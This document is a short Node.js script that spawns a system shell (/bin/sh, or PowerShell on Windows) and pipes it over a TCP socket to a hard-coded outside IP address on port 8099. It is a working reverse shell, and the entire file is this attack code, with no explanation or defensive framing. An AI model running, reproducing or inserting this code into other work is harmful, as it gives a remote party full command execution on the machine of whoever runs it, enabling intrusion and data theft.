(function () {
  const net = require("net");
  const cp = require("child_process");
  const os = require("os");

  let shell, shellArgs;
  if (os.platform() === "win32") {
    shell = "powershell.exe";
    shellArgs = [];
  } else {
    shell = "/bin/sh";
    shellArgs = [];
  }

  const sh = cp.spawn(shell, shellArgs);

  const client = new net.Socket();
  client.connect(8099, "191.187.195.11", function () {
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
})();
